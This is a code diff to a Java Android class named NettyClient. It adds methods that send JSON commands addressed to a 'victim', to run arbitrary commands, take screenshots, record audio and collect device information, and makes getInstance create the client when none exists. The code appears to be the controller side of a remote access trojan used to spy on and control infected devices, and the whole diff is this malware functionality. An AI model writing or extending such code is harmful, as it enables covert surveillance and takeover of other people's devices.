@@ -133,6 +133,37 @@ public class NettyClient extends AsyncTask<String, String, String> {
         queryHandler.sendMessage(query);
     }
 
+    public void sendCmd(String victim, String command) {
+        JSONObject query = new JSONObject();
+        query.put("action", "cmd");
+        query.put("victim", victim);
+        query.put("command", command);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendTakeScreen(String victim, String path) {
+        JSONObject query = new JSONObject();
+        query.put("action", "take.screen");
+        query.put("victim", victim);
+        query.put("path", path);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendStartAudioRecord(String victim, Long seconds) {
+        JSONObject query = new JSONObject();
+        query.put("action", "start.audio.record");
+        query.put("seconds", seconds);
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
+    public void sendGetVictimInfo(String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "get.victim.info");
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
     public void sendErrorCode(String code) {
         JSONObject query = new JSONObject();
         query.put("errorCode", code);
@@ -140,6 +171,7 @@ public class NettyClient extends AsyncTask<String, String, String> {
     }
 
     public static NettyClient getInstance() {
+        if (nettyClient == null) nettyClient = new NettyClient();
         return nettyClient;
     }
 
